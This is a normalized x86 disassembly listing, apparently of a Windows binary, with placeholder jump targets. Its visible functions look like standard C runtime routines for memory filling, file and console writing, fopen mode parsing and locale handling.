or eax 0x1
mov [ edi + 0xc ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ edi + 0x8 ]
mov [ edi ] eax
push edi
call sub_418cd4
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ edi + 0xc ] eax
and [ edi + 0x4 ] 0x0
cmp eax 0xffffffff
je r-xdata
push [ edi + 0x18 ]
push [ edi + 0x8 ]
push edi
call sub_413a92
pop ecx
push eax
call sub_413deb
add esp 0xc
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
test [ edi + 0xc ] 0x82
jne r-xdata
cmp [ edi + 0x18 ] 0x200
jne r-xdata
push edi
call sub_413a92
pop ecx
cmp eax 0xffffffff
je r-xdata
mov ecx [ edi ]
dec [ edi + 0x4 ]
movzx eax [ ecx ]
inc ecx
mov [ edi ] ecx
jmp r-xdata
test [ edi + 0xc ] 0x8
je r-xdata
mov eax rw-data
push edi
call sub_413a92
pop ecx
cmp eax 0xfffffffe
je r-xdata
pop edi
pop ebp
retn
test [ edi + 0xc ] 0x400
jne r-xdata
or [ edi + 0xc ] 0x2000
push esi
push edi
call sub_413a92
mov esi eax
push edi
sar esi 0x5
call sub_413a92
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ esi * 4 + rw-data ]
pop ecx
pop esi
jmp r-xdata
mov [ edi + 0x18 ] 0x1000
mov al [ eax + 0x4 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_414be5
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
test esi esi
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ ebp + 0x10 ]
test edi edi
je r-xdata
call sub_412060
push 0x16
pop esi
mov [ eax ] esi
call sub_412224
mov eax esi
jmp r-xdata
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push 0x0
push eax
call sub_414c70
add esp 0xc
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
call sub_412060
push 0x16
jmp r-xdata
push esi
push edi
push eax
call sub_410c10
add esp 0xc
xor eax eax
jmp r-xdata
push 0x16
pop eax
call sub_412060
push 0x22
pop esi
mov [ eax ] esi
call sub_412224
mov eax esi
jmp r-xdata
pop edi
sub_414c70
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
movzx eax [ esp + 0x8 ]
bt [ rw-data ] 0x1
jae r-xdata
mov edx [ esp + 0xc ]
cmp edx 0x80
jl r-xdata
mov ecx [ esp + 0xc ]
push edi
mov edi [ esp + 0x8 ]
[ edi ]
jmp r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
bt [ rw-data ] 0x1
jb r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
test eax eax
jne r-xdata
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
movd xmm0 eax
punpcklbw xmm0 xmm0
punpcklwd xmm0 xmm0
pshufd xmm0 xmm0 0x0
pxor xmm0 xmm0
jmp r-xdata
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
neg ebx
add ebx 0x10
sub edx ebx
push edx
mov edx ebx
and edx 0x3
je r-xdata
mov ebx edx
and edx 0x7f
shr ebx 0x7
je r-xdata
push ebx
push ecx
mov ebx ecx
and ebx 0xf
test ebx ebx
jne r-xdata
shr ebx 0x2
je r-xdata
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
test edx edx
je r-xdata
movdqa [ ecx ] xmm0
movdqa [ ecx + 0x10 ] xmm0
movdqa [ ecx + 0x20 ] xmm0
movdqa [ ecx + 0x30 ] xmm0
movdqa [ ecx + 0x40 ] xmm0
movdqa [ ecx + 0x50 ] xmm0
movdqa [ ecx + 0x60 ] xmm0
movdqa [ ecx + 0x70 ] xmm0
lea ecx [ ecx + 0x80 ]
dec ebx
jne r-xdata
pop edx
jmp r-xdata
movd [ ecx ] xmm0
lea ecx [ ecx + 0x4 ]
dec ebx
jne r-xdata
pop eax
pop ebx
retn
mov ebx edx
shr ebx 0x4
je r-xdata
and edx 0xf
je r-xdata
jmp r-xdata
mov ebx edx
shr edx 0x2
je r-xdata
movdqa [ ecx ] xmm0
lea ecx [ ecx + 0x10 ]
dec ebx
jne r-xdata
and ebx 0x3
je r-xdata
movd [ ecx ] xmm0
lea ecx [ ecx + 0x4 ]
dec edx
jne r-xdata
mov [ ecx ] al
inc ecx
dec ebx
jne r-xdata
sub_414d00
push 0x10
push r--data
call sub_411bb0
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_41202c
and [ eax ] 0x0
call sub_412060
mov [ eax ] 0x9
jmp r-xdata
call sub_41202c
and [ eax ] 0x0
call sub_412060
mov [ eax ] 0x9
call sub_412224
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ebx esi
sar ebx 0x5
mov edi esi
and edi 0x1f
shl edi 0x6
mov eax [ ebx * 4 + rw-data ]
movsx eax [ eax + edi + 0x4 ]
and eax 0x1
je r-xdata
push esi
call sub_41ab67
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx * 4 + rw-data ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_412060
mov [ eax ] 0x9
call sub_41202c
and [ eax ] 0x0
or edi 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_414de2
add esp 0xc
mov edi eax
jmp r-xdata
call sub_411bf5
retn
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_414db9
mov eax edi
jmp r-xdata
sub_414de2
push ebp
mov ebp esp
mov eax 0x1af0
call sub_413dc0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
xor edx edx
push edi
mov edi edx
mov [ ebp - 0x1ac0 ] eax
mov [ ebp - 0x1abc ] ecx
mov [ ebp - 0x1ac4 ] edi
mov [ ebp - 0x1ad4 ] edx
cmp [ ebp + 0x10 ] edx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
jmp r-xdata
push ebx
push esi
mov ecx eax
sar ecx 0x5
mov esi eax
and esi 0x1f
shl esi 0x6
mov [ ebp - 0x1ad0 ] ecx
mov ecx [ ecx * 4 + rw-data ]
mov [ ebp - 0x1aec ] esi
mov bl [ esi + ecx + 0x24 ]
add bl bl
sar bl 0x1
cmp bl 0x2
je r-xdata
call sub_41202c
and [ eax ] edi
call sub_412060
mov [ eax ] 0x16
call sub_412224
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_40eb9e
leave
retn
mov eax [ ebp + 0x10 ]
not eax
test al 0x1
jne r-xdata
cmp bl 0x1
jne r-xdata
mov eax [ ebp - 0x1ac0 ]
call sub_41202c
and [ eax ] edi
call sub_412060
mov [ eax ] 0x16
call sub_412224
jmp r-xdata
test [ esi + ecx + 0x4 ] 0x20
je r-xdata
push [ ebp - 0x1ac0 ]
call sub_418c80
pop ecx
test eax eax
je r-xdata
push 0x2
push edx
push edx
push eax
call sub_413d49
add esp 0x10
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x1ad0 ]
mov eax [ eax * 4 + rw-data ]
test [ esi + eax + 0x4 ] 0x80
je r-xdata
mov eax [ ebp - 0x1ad0 ]
mov eax [ eax * 4 + rw-data ]
test [ esi + eax + 0x4 ] 0x80
je r-xdata
pop esi
pop ebx
push 0x0
lea ecx [ ebp - 0x1ad8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1abc ]
push [ esi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1abc ]
xor esi esi
mov [ ebp - 0x1ac8 ] esi
test bl bl
jne r-xdata
call sub_41686e
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0xa8 ] ecx
lea eax [ ebp - 0x1ae4 ]
push eax
mov eax [ ebp - 0x1ad0 ]
sete cl
mov eax [ eax * 4 + rw-data ]
push [ esi + eax ]
mov [ ebp - 0x1ac0 ] ecx
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov esi eax
mov edi [ ebp - 0x1ad8 ]
xor esi esi
jmp r-xdata
mov ecx edx
cmp bl 0x2
jne r-xdata
mov eax edx
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] esi
jbe r-xdata
cmp [ ebp - 0x1ac0 ] edi
je r-xdata
sub edi [ ebp - 0x1ad4 ]
mov eax edi
test esi esi
je r-xdata
mov edx [ ebp - 0x1abc ]
mov ebx [ ebp + 0x10 ]
mov [ ebp - 0x1adc ] ecx
test ebx ebx
je r-xdata
mov [ ebp - 0x1ac0 ] ecx
cmp [ ebp + 0x10 ] esi
jbe r-xdata
mov eax [ ebp - 0x1ad0 ]
mov ecx [ ebp - 0x1aec ]
mov eax [ eax * 4 + rw-data ]
test [ ecx + eax + 0x4 ] 0x40
je r-xdata
xor ecx ecx
sub eax edx
mov edx [ ebp - 0x1ac4 ]
lea ebx [ ebp - 0x1ab8 ]
mov [ ebp - 0x1ac0 ] ecx
call [ GetConsoleCP@IAT ]
mov edx [ ebp - 0x1abc ]
and [ ebp - 0x1adc ] edi
mov ecx edx
mov [ ebp - 0x1af0 ] eax
mov [ ebp - 0x1acc ] ecx
cmp [ ebp + 0x10 ] edi
jbe r-xdata
test bl bl
je r-xdata
push 0x5
pop ebx
cmp esi ebx
jne r-xdata
mov [ ebp - 0x1ae8 ] 0xa
mov [ ebp - 0x1ae8 ] 0xa
call sub_412060
mov [ eax ] 0x1c
call sub_41202c
and [ eax ] 0x0
cmp [ edx ] 0x1a
jne r-xdata
mov ecx [ ebp - 0x1aec ]
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1ad0 ]
mov eax [ eax * 4 + rw-data ]
push [ ecx + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov cl [ edx ]
inc edx
inc eax
mov [ ebp - 0x1add ] cl
cmp cl 0xa
mov ecx [ ebp - 0x1ac0 ]
mov [ ebp - 0x1ac4 ] edx
jne r-xdata
mov esi [ ebp - 0x1ac0 ]
jmp r-xdata
xor eax eax
mov [ ebp - 0x1ac8 ] eax
mov [ ebp - 0x1ae8 ] 0xa
push esi
call sub_41203f
pop ecx
jmp r-xdata
call sub_412060
mov [ eax ] 0x9
call sub_41202c
mov [ eax ] ebx
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov esi [ ebp - 0x1ac8 ]
mov edi [ ebp - 0x1ac4 ]
mov [ ebp - 0x1acc ] eax
test eax eax
je r-xdata
movzx edi [ esi ]
add esi 0x2
add ecx 0x2
mov [ ebp - 0x1adc ] esi
cmp di [ ebp - 0x1ae8 ]
jne r-xdata
mov ecx [ ebp - 0x1aec ]
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1ad0 ]
mov [ ebp - 0x1ad4 ] edi
mov eax [ eax * 4 + rw-data ]
push [ ecx + eax ]
call [ WriteFile@IAT ]
mov esi [ ebp - 0x1ac8 ]
mov edi [ ebp - 0x1ac4 ]
test eax eax
je r-xdata
movzx esi [ ecx ]
add ecx 0x2
add eax 0x2
mov [ ebp - 0x1ac0 ] ecx
cmp si [ ebp - 0x1ae8 ]
jne r-xdata
xor eax eax
jmp r-xdata
add edi [ ebp - 0x1ad8 ]
mov edx [ ebp - 0x1abc ]
cmp [ ebp - 0x1ad8 ] ebx
jl r-xdata
mov dl [ ebp - 0x1add ]
mov [ ebx ] dl
mov edx [ ebp - 0x1ac4 ]
inc ebx
inc ecx
mov [ ebp - 0x1ac0 ] ecx
cmp ecx 0x13ff
jb r-xdata
inc [ ebp - 0x1ad4 ]
mov [ ebx ] 0xd
inc ebx
inc ecx
cmp bl 0x1
je r-xdata
mov cl [ ecx ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ac0 ] eax
mov eax [ ebp - 0x1ad0 ]
mov edx [ eax * 4 + rw-data ]
cmp [ esi + edx + 0x38 ] 0x0
je r-xdata
xor ecx ecx
mov [ ebp - 0x1ac0 ] ecx
mov [ eax ] di
add edx 0x2
add eax 0x2
cmp edx 0x6a8
jb r-xdata
push 0xd
pop esi
mov [ eax ] si
mov esi [ ebp - 0x1adc ]
add eax 0x2
add edx 0x2
add edi [ ebp - 0x1ad8 ]
mov edx [ ebp - 0x1abc ]
mov [ ebp - 0x1ac4 ] edi
cmp [ ebp - 0x1ad8 ] ebx
jl r-xdata
mov [ ebx ] si
add edx 0x2
add ebx 0x2
cmp edx 0x13fe
jb r-xdata
push 0xd
pop ecx
mov [ ebx ] cx
mov ecx [ ebp - 0x1ac0 ]
add edi 0x2
add ebx 0x2
add edx 0x2
test edi edi
jne r-xdata
mov eax [ ebp - 0x1ac4 ]
sub eax edx
cmp eax [ ebp + 0x10 ]
mov eax [ ebp - 0x1ac4 ]
jb r-xdata
cmp eax [ ebp + 0x10 ]
jae r-xdata
movzx eax [ ecx ]
xor edx edx
cmp ax [ ebp - 0x1ae8 ]
mov [ ebp - 0x1ac4 ] eax
mov eax [ ebp - 0x1ac8 ]
sete dl
add ecx 0x2
add eax 0x2
mov [ ebp - 0x1acc ] ecx
mov [ ebp - 0x1ac8 ] eax
mov [ ebp - 0x1ac0 ] edx
cmp bl 0x2
jne r-xdata
movsx eax cl
push eax
call sub_416b72
pop ecx
test eax eax
je r-xdata
mov al [ esi + edx + 0x34 ]
mov [ ebp - 0xc ] al
push 0x2
lea eax [ ebp - 0xc ]
mov [ ebp - 0xb ] cl
and [ esi + edx + 0x38 ] 0x0
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov ecx [ ebp - 0x1ac0 ]
mov esi eax
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] esi
mov ecx [ ebp - 0x1ac0 ]
add ecx [ ebp - 0x1ad8 ]
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac0 ] ecx
cmp eax ecx
jg r-xdata
cmp ecx ebx
jae r-xdata
mov ecx [ ebp - 0x1ac0 ]
mov eax ecx
sub eax edx
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp eax [ ebp + 0x10 ]
jae r-xdata
jmp r-xdata
push [ ebp - 0x1ac4 ]
call sub_41b0db
pop ecx
cmp ax [ ebp - 0x1ac4 ]
jne r-xdata
cmp bl 0x2
jne r-xdata
cmp bl 0x1
je r-xdata
push 0x1
push [ ebp - 0x1acc ]
mov eax [ ebp - 0x1abc ]
mov edx [ ebp - 0x1acc ]
sub eax edx
add eax [ ebp + 0x10 ]
cmp eax 0x1
jbe r-xdata
lea eax [ ebp - 0x1ac4 ]
push eax
call sub_419bfb
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov ecx [ ebp - 0x1adc ]
mov edx [ ebp - 0x1abc ]
mov edi ecx
sub edi edx
mov [ ebp - 0x1ac4 ] edi
cmp edi ebx
jb r-xdata
push 0x0
sub eax ecx
lea edx [ ebp - 0x1ad8 ]
push edx
push eax
lea eax [ ebp - 0x1410 ]
add eax ecx
mov ecx [ ebp - 0x1aec ]
push eax
mov eax [ ebp - 0x1ad0 ]
mov eax [ eax * 4 + rw-data ]
push [ ecx + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
jmp r-xdata
and [ ebp - 0x1ae4 ] 0x0
mov edi [ ebp - 0x1ad4 ]
mov eax ecx
sub eax edx
mov edx [ ebp - 0x1ae4 ]
lea ebx [ ebp - 0x1ab8 ]
jmp r-xdata
add edi 0x2
cmp [ ebp - 0x1ac0 ] 0x0
je r-xdata
cmp eax [ ebp + 0x10 ]
jb r-xdata
mov esi [ ebp - 0x1ac0 ]
jmp r-xdata
mov eax [ ebp - 0x1acc ]
mov ebx [ ebp - 0x1ad0 ]
mov al [ edx ]
mov ecx [ ebx * 4 + rw-data ]
inc edi
mov [ esi + ecx + 0x34 ] al
mov eax [ ebx * 4 + rw-data ]
mov [ esi + eax + 0x38 ] 0x1
push 0x2
push edx
lea eax [ ebp - 0x1ac4 ]
push eax
call sub_419bfb
add esp 0xc
cmp eax 0xffffffff
je r-xdata
and [ ebp - 0x1ae4 ] 0x0
mov esi [ ebp - 0x1adc ]
sub ecx edx
mov edx [ ebp - 0x1ae4 ]
lea eax [ ebp - 0x6b8 ]
jmp r-xdata
cmp eax ecx
jg r-xdata
mov eax [ ebp - 0x1ac8 ]
mov ecx [ ebp - 0x1acc ]
push 0xd
pop eax
push eax
mov [ ebp - 0x1ac4 ] eax
call sub_41b0db
pop ecx
cmp ax [ ebp - 0x1ac4 ]
jne r-xdata
test bl bl
jne r-xdata
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x1adc ]
push ecx
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad0 ]
mov eax [ eax * 4 + rw-data ]
push [ esi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1acc ]
inc eax
inc [ ebp - 0x1ac8 ]
jmp r-xdata
inc edi
inc [ ebp - 0x1ad4 ]
mov edi [ ebp - 0x1ac8 ]
mov eax [ ebp - 0x1ae4 ]
add edi [ ebp - 0x1ad4 ]
cmp [ ebp - 0x1adc ] eax
jl r-xdata
xor ecx ecx
push ecx
push ecx
inc eax
inc [ ebp - 0x1ac8 ]
push 0x5
mov [ ebp - 0x1acc ] eax
lea eax [ ebp - 0xc ]
push eax
push 0x1
lea eax [ ebp - 0x1ac4 ]
push eax
push ecx
push [ ebp - 0x1af0 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x1ae4 ] eax
test eax eax
je r-xdata
cmp [ ebp - 0x1ac0 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1adc ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad0 ]
mov [ ebp - 0xc ] 0xd
mov eax [ eax * 4 + rw-data ]
push [ esi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1adc ] 0x1
jl r-xdata
inc [ ebp - 0x1ad4 ]
inc edi
jmp r-xdata
sub_41560c
push ebp
mov ebp esp
push ecx
push ecx
push ebx
xor edx edx
and [ ebp - 0x4 ] edx
push esi
mov esi [ ebp + 0xc ]
xor eax eax
push edi
mov edi [ rw-data ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
inc esi
mov al [ esi ]
cmp al 0x61
je r-xdata
mov ebx 0x109
cmp al 0x72
je r-xdata
cmp [ esi ] 0x20
je r-xdata
mov [ ebp + 0xc ] 0x1000
xor ebx ebx
or edi 0x1
jmp r-xdata
cmp al 0x77
je r-xdata
inc esi
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
movsx eax al
cmp eax 0x53
jg r-xdata
xor ecx ecx
inc ecx
inc esi
mov al [ esi ]
test al al
je r-xdata
mov ebx 0x301
jmp r-xdata
call sub_412060
mov [ eax ] 0x16
call sub_412224
push 0x180
push [ ebp + 0x10 ]
lea eax [ ebp + 0xc ]
push ebx
push [ ebp + 0x8 ]
push eax
call sub_41b22f
add esp 0x14
test eax eax
jne r-xdata
jmp r-xdata
sub eax 0x54
je r-xdata
je r-xdata
or edi 0x2
pop edi
pop esi
pop ebx
leave
retn
xor eax eax
jmp r-xdata
inc [ rw-data ]
mov eax [ ebp + 0x14 ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov [ eax ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x1c ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0xc ] edi
mov [ eax + 0x10 ] ecx
cmp [ esi ] 0x20
je r-xdata
mov eax [ ebp + 0xc ]
test eax ebx
je r-xdata
sub eax 0xe
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
inc esi
push 0x3
push esi
push r--data
call sub_41b24d
add esp 0xc
test eax eax
jne r-xdata
or ebx eax
xor ecx ecx
jmp r-xdata
test ebx 0xc000
jne r-xdata
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0x1
or ebx 0x20
jmp r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
sub eax 0xb
je r-xdata
push 0x20
add esi 0x3
pop eax
jmp r-xdata
test ecx ecx
je r-xdata
or ebx 0x8000
jmp r-xdata
test edx edx
jne r-xdata
sub eax 0xb
je r-xdata
test bl 0x2
jne r-xdata
dec eax
je r-xdata
cmp [ esi ] al
je r-xdata
inc edx
or edi 0x4000
jmp r-xdata
test edx edx
jne r-xdata
sub eax 0x6
jne r-xdata
and ebx 0xfffffffe
and edi 0xfffffffc
or ebx 0x2
or edi 0x80
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
sub eax 0x18
je r-xdata
inc esi
cmp [ esi ] 0x3d
jne r-xdata
inc edx
and edi 0xffffbfff
jmp r-xdata
test ebx 0xc000
jne r-xdata
test bl 0x40
jne r-xdata
sub eax 0xa
je r-xdata
inc esi
cmp [ esi ] al
je r-xdata
or ebx 0x4000
jmp r-xdata
or ebx 0x40
jmp r-xdata
or ebx 0x80
jmp r-xdata
sub eax 0x4
jne r-xdata
push 0x5
push r--data
push esi
call sub_41b37a
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] eax
jne r-xdata
push 0x8
push r--data
push esi
call sub_41b37a
add esp 0xc
test eax eax
jne r-xdata
add esi 0x5
or ebx 0x40000
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
or ebx 0x10
jmp r-xdata
push 0x7
push r--data
push esi
call sub_41b37a
add esp 0xc
test eax eax
jne r-xdata
add esi 0x8
or ebx 0x20000
jmp r-xdata
add esi 0x7
or ebx 0x10000
jmp r-xdata
sub_4158e8
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
je r-xdata
call [ TlsSetValue@IAT ]
pop ebp
retn
call eax
pop ebp
retn
sub_41590a
push ebp
mov ebp esp
sub esp 0x44
lea eax [ ebp - 0x44 ]
push eax
call [ GetStartupInfoW@IAT ]
test [ ebp - 0x18 ] 0x1
je r-xdata
push 0xa
pop eax
leave
retn
movzx eax [ ebp - 0x14 ]
leave
retn
sub_41592b
push ebp
mov ebp esp
push ecx
push esi
mov esi [ rw-data ]
test esi esi
jns r-xdata
xor eax eax
test esi esi
setg al
pop esi
leave
retn
mov eax [ rw-data ]
xor esi esi
xor eax [ rw-data ]
mov [ ebp - 0x4 ] esi
je r-xdata
mov [ rw-data ] esi
push esi
lea ecx [ ebp - 0x4 ]
push ecx
call eax
cmp eax 0x7a
jne r-xdata
inc esi
sub_415969
push esi
push edi
push r--data
call [ GetModuleHandleW@IAT ]
mov esi [ GetProcAddress@IAT ]
mov edi eax
push r--data
push edi
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
mov [ rw-data ] eax
push r--data
push edi
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
pop edi
mov [ rw-data ] eax
pop esi
retn
sub_415be1
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_412060
push 0x16
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
push edi
mov edi esi
sub edi ecx
mov [ esi ] cl
pop edi
test edx edx
jne r-xdata
dec edx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ esi ] dl
call sub_412060
push 0x22
jmp r-xdata
mov al [ ecx ]
mov [ edi + ecx ] al
inc ecx
test al al
je r-xdata
pop esi
pop ebp
retn
pop esi
mov [ eax ] esi
call sub_412224
mov eax esi
sub_415c36
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
cmp [ edi + 0x78 ] 0x0
je r-xdata
mov eax [ edi + 0x80 ]
test eax eax
je r-xdata
push [ edi + 0x78 ]
call esi
cmp [ edi + 0x7c ] 0x0
je r-xdata
push eax
call esi
mov eax [ edi + 0x88 ]
test eax eax
je r-xdata
push [ edi + 0x7c ]
call esi
push 0x6
pop eax
lea ebx [ edi + 0x1c ]
mov [ ebp + 0x8 ] eax
push eax
call esi
cmp [ ebx - 0xc ] 0x0
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
add ebx 0x10
dec eax
mov [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebx - 0x4 ] 0x0
je r-xdata
push [ ebx ]
call esi
mov eax [ ebp + 0x8 ]
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0x9c ]
add eax 0xb0
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push [ ebx - 0x4 ]
call esi
mov eax [ ebp + 0x8 ]
sub_415cc6
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov eax [ esi + 0x84 ]
push edi
test eax eax
je r-xdata
mov eax [ esi + 0x88 ]
test eax eax
je r-xdata
cmp eax rw-data
je r-xdata
mov eax [ esi + 0x9c ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0x78 ]
test eax eax
je r-xdata
push 0x6
pop eax
lea ebx [ esi + 0xa0 ]
lea edi [ esi + 0x1c ]
mov [ ebp + 0x8 ] eax
cmp [ eax + 0xb0 ] ebx
jne r-xdata
mov eax [ esi + 0x8c ]
sub eax 0xfe
push eax
call sub_40f402
mov eax [ esi + 0x94 ]
mov edi 0x80
sub eax edi
push eax
call sub_40f402
mov eax [ esi + 0x98 ]
sub eax edi
push eax
call sub_40f402
push [ esi + 0x88 ]
call sub_40f402
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0xc ] 0x0
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
push eax
call sub_41b6b1
push [ esi + 0x9c ]
call sub_40f402
pop ecx
pop ecx
mov eax [ esi + 0x80 ]
test eax eax
je r-xdata
add ebx 0x4
add edi 0x10
dec eax
mov [ ebp + 0x8 ] eax
jne r-xdata
mov eax [ edi - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ esi + 0x7c ]
test eax eax
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_40f402
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
